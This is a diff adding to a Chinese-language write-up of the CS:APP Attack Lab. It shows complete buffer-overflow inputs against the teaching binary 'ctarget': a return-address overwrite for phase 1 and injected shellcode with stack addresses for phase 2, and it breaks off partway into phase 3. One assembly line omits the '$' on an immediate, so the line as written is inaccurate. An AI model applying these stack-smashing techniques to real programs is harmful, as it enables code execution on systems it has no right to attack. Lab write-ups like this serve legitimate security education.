@@ -891,13 +891,124 @@ objdump -d ctarget >ctarget.asm
 
 查看汇编代码，发现大量函数，其中比较重要的是这些：
 - `initialize_target`：
-- `main`：设置信号处理函数、输入流，调用`initialize_target`
+- `main`：设置信号处理函数、输入流，先调用`initialize_target`，再调用`stable_launch`
 - `scramble`：
-- `getbuf`：
+- `getbuf`：开辟40字节的缓冲区，调用`Gets`
 - `touch1`：目标函数1
 - `touch2`：目标函数2
 - `hexmatch`：
 - `touch3`：目标函数3
-- `test`：
+- `test`：调用`getbuf`，并判断是否发生了预期的攻击行为
 - `save_char`：
 - `save_term`：
+- `Gets`：无休止读取到缓冲区，直到发生EOF
+- `launch`：执行`test`函数，并判断`test`函数的行为是否符合预期
+- `stable_launch`：根据对源码的解读，其功能似乎是先暂存当前的栈地址，并将程序的栈地址临时转移到一个由`mmap`创建的固定地址，随后调用`launch`，最后恢复原来的栈地址
+
+根据实验Writeup，phase1并不涉及代码注入，而是要求通过构造输入，使代码执行`touch1`函数。分析`getbuf`函数的汇编源码：
+
+```assembly
+00000000004017a8 <getbuf>:
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
+  4017ac:	48 89 e7             	mov    %rsp,%rdi
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp
+  4017bd:	c3                   	retq   
+  4017be:	90                   	nop
+  4017bf:	90                   	nop
+```
+
+一个比较明显的漏洞是，缓冲区只有40字节，所以只要输入超过40字节，多余的输入便会写入缓冲区外的栈帧部分。对于`getbuf`而言，缓冲区后的8字节是函数的返回地址，因此可以通过刻意构造写入的第41-48字节内容，篡改函数的返回地址。
+
+本phase中我们要非法访问`touch1`，而其地址为`0x4017c0`，因此可以如下构造phase1的输入：
+
+```
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+c0 17 40 00 00 00 00 00
+```
+
+成功：
+
+![[Pasted image 20240731085520.png]]
+
+### phase2
+
+phase2要求执行这个函数：
+
+```c
+void touch2(unsigned val)
+{
+	vlevel = 2; /* Part of validation protocol */
+	if (val == cookie) {
+		printf("Touch2!: You called touch2(0x%.8x)\n", val);
+		validate(2);
+	} else {
+		printf("Misfire: You called touch2(0x%.8x)\n", val);
+		fail(2);
+	}
+	exit(0);
+}
+```
+
+与`touch1`不同的是，`touch2`需要传入一个正确的参数，否则即使调用了也不成功。
+
+Writeup中给的建议：
+- 有可能需要在输入中自行指定返回地址，这样`getbuf`返回时会指向它。
+- 函数第一个参数存储在`%rdi`寄存器中。
+- 注入代码应当至少实现传入参数，随后通过`ret`指令将控制权转至`touch2`的第一条指令。
+- 不推荐使用`jump`或`call`，因为这些指令的目标地址编码难于生成。
+
+思路：
+- 输入的前40字节用于注入需要执行的指令。
+- 第41-48字节用于注入第一次返回地址（从`getbuf`返回到注入指令处）
+- 第49-56字节用于注入第二次返回地址（从注入指令处返回到`touch2`）
+
+通过GDB调试发现，`getbuf`中的输入缓冲区首地址是`0x5561dc78`。这也是第一次返回地址，该地址将会被`ret`指令误当作代码返回地址，从而到达我们注入的代码处：
+
+![[Pasted image 20240731102212.png]]
+
+计划注入这2条指令：
+
+```
+mov 0x59b997fa, %edi
+retq
+```
+
+它们的编码为`bf fa 97 b9 59 c3`。而第二次返回地址，即`touch2`的首地址为`0x4017ec`，因此phase2的输入构造如下：
+
+```
+bf fa 97 b9 59 c3 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+78 dc 61 55 00 00 00 00
+ec 17 40 00 00 00 00 00
+```
+
+成功：
+
+![[Pasted image 20240731104343.png]]
+
+### phase3
+
+phase3要求执行`touch3`函数：
+
+`touch3`会调用`hexmatch`函数，判断：
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval)
+{
+	char cbuf[110];
+	/* Make position of check string unpredictable */
+	char *s = cbuf + random() % 100;
+	sprintf(s, "%.8x", val);
+	return strncmp(sval, s, 9) == 0;
+}
+```
